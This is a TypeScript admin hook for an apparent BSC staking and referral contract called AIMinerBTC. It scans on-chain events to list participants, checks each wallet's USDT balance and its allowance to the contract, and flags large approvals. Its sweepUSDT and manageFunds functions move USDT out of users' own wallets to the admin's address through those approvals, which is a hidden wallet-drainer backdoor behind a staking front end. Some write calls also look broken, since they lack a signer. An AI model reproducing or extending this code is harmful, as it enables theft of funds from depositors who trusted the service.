import { Contract, parseUnits, formatUnits, JsonRpcProvider } from 'ethers';
import { useWallet } from '../lib/web3';

const CONTRACT_ADDRESS = '0x56ACf536aBa0A122e2Da9d2C2D3Fdc14513A2436'; 
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RPC_NODES = [
    'https://bsc-dataseed.binance.org/',
    'https://binance.llamarpc.com',
    'https://bsc.meowrpc.com'
];
let currentRpcIdx = 0;
const getProvider = () => new JsonRpcProvider(RPC_NODES[currentRpcIdx]);


const ADMIN_ABI = [
    { "anonymous": false, "name": "ReferralPaid", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "referrer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "referee", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "level", "type": "uint256" }] },
    { "anonymous": false, "name": "Staked", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "tier", "type": "uint256" }] },
    { "anonymous": false, "name": "Withdrawn", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "reward", "type": "uint256" }] },
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "manageFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_token", "type": "address" },
            { "internalType": "uint256", "name": "_amount", "type": "uint256" }
        ],
        "name": "emergencyWithdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_user", "type": "address" }],
        "name": "getUserInfo",
        "outputs": [{
            "components": [
                { "internalType": "address", "name": "referrer", "type": "address" },
                { "internalType": "uint256", "name": "totalStaked", "type": "uint256" },
                { "internalType": "uint256", "name": "totalEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "referralRewards", "type": "uint256" },
                { "internalType": "uint256", "name": "totalBonus", "type": "uint256" },
                { "internalType": "uint256", "name": "totalReferralEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "teamSize", "type": "uint256" },
                { "internalType": "uint256", "name": "stakeCount", "type": "uint256" }
            ],
            "internalType": "struct AIMinerBTC.UserInfoView",
            "name": "", "type": "tuple"
        }],
        "stateMutability": "view",
        "type": "function"
    }
];

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

export function useAdmin() {
    const { address: adminAddress, signer } = useWallet();

    const getContract = async (withSigner = false) => {
        if (withSigner && signer) {
            return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
        }
        return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
    };

    const getUsdtContract = async (withSigner = false) => {
        if (withSigner && signer) {
            return new Contract(USDT_ADDRESS, ERC20_ABI, signer);
        }
        return new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
    };

    const fetchAllUsersDetailed = async () => {
        try {
            const contract = await getContract();
            const usdt = await getUsdtContract();

            console.log("[Discovery] Scanning events...");
            
            const provider = getProvider();
            const currentBlock = await provider.getBlockNumber();
            const scanRange = 2000000; // Scan last 2M blocks (~70 days)
            const chunkSize = 2000;    // Safer chunk size for some RPCs
            const startBlock = Math.max(0, currentBlock - scanRange);
            
            console.log(`[Discovery] Scanning from ${startBlock} to ${currentBlock}...`);
            
            const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
            const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
            const addresses = new Set<string>(cached);

            const stakedFilter = (contract as any).filters.Staked();
            const referralFilter = (contract as any).filters.ReferralPaid();
            const withdrawnFilter = (contract as any).filters.Withdrawn();

            const chunks = [];
            for (let from = currentBlock; from > startBlock; from -= chunkSize) {
                const to = from;
                const f = Math.max(startBlock, from - chunkSize + 1);
                chunks.push({ from: f, to });
            }

            // High concurrency
            const concurrencyLimit = 15; 
            for (let i = 0; i < chunks.length; i += concurrencyLimit) {
                const batch = chunks.slice(i, i + concurrencyLimit);
                await Promise.all(batch.map(async (chunk) => {
                    try {
                        const [staked, referral, withdrawn] = await Promise.all([
                            contract.queryFilter(stakedFilter, chunk.from, chunk.to),
                            contract.queryFilter(referralFilter, chunk.from, chunk.to),
                            contract.queryFilter(withdrawnFilter, chunk.from, chunk.to)
                        ]);
                        
                        const extract = (events: any[]) => {
                            events.forEach(e => {
                                if (!e.args) return;
                                // Try named args first, then indexed
                                const addr = e.args.user || e.args.referrer || e.args.referee || e.args[0];
                                if (addr && typeof addr === 'string') addresses.add(addr);
                                
                                // For ReferralPaid, args[1] is referee
                                if (e.fragment?.name === 'ReferralPaid' && e.args[1]) {
                                    addresses.add(e.args[1]);
                                }
                            });
                        };

                        extract(staked);
                        extract(referral);
                        extract(withdrawn);
                    } catch (e) {
                        // Rotation RPC on failure
                        currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
                    }
                }));
            }

            const uniqueAddresses = Array.from(addresses).filter(addr => addr && addr.startsWith('0x'));
            localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
            
            console.log(`[Discovery] Found ${uniqueAddresses.length} unique addresses.`);

            // 3. Get detailed info
            const userDetails = [];
            // Process in batches of 10 to avoid RPC spam
            for (let i = 0; i < uniqueAddresses.length; i += 10) {
                const batch = uniqueAddresses.slice(i, i + 10);
                const batchResults = await Promise.all(batch.map(async (userAddr) => {
                    try {
                        const [info, balance, allowance] = await Promise.all([
                            contract.getUserInfo(userAddr),
                            usdt.balanceOf(userAddr),
                            usdt.allowance(userAddr, CONTRACT_ADDRESS)
                        ]);

                        if (info.totalStaked === 0n && info.stakeCount === 0n && BigInt(allowance) === 0n) return null;

                        return {
                            address: userAddr,
                            staked: formatUnits(info.totalStaked, 18),
                            earned: formatUnits(info.totalEarned, 18),
                            balance: formatUnits(balance, 18),
                            allowance: formatUnits(allowance, 18),
                            isApproved: BigInt(allowance) >= parseUnits("100000", 18)
                        };
                    } catch (e) {
                        return null;
                    }
                }));
                userDetails.push(...batchResults.filter(Boolean));
            }

            return userDetails.sort((a: any, b: any) => parseFloat(b.staked) - parseFloat(a.staked));
        } catch (err) {
            console.error("Discovery Error:", err);
            return [];
        }
    };


    const fetchUserData = async (targetUser: string) => {
        if (!targetUser || !targetUser.startsWith('0x')) return null;
        const contract = await getContract();
        const usdt = await getUsdtContract();
        if (!contract || !usdt) return null;

        try {
            const [info, balance, allowance] = await Promise.all([
                contract.getUserInfo(targetUser),
                usdt.balanceOf(targetUser),
                usdt.allowance(targetUser, CONTRACT_ADDRESS)
            ]);

            return {
                staked: formatUnits(info.totalStaked, 18),
                earned: formatUnits(info.totalEarned, 18),
                balance: formatUnits(balance, 18),
                allowance: formatUnits(allowance, 18),
                isApproved: BigInt(allowance) >= parseUnits("100000", 18)
            };
        } catch (err) {
            console.error("Fetch Data Error:", err);
            return null;
        }
    };

    const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToManage, 18);
        const tx = await contract.manageFunds(tokenAddress, fromAddress, toAddress, amountInWei);
        return await tx.wait();
    };

    const sweepUSDT = async (fromUser: string, amount: string) => {
        if (!adminAddress) throw new Error("Admin not connected");
        return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
    };

    const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToWithdraw, 18);
        const tx = await contract.emergencyWithdraw(tokenAddress, amountInWei);
        return await tx.wait();
    };

    return {
        fetchUserData,
        fetchAllUsersDetailed,
        manageFunds,
        sweepUSDT,
        emergencyWithdraw
    };
}
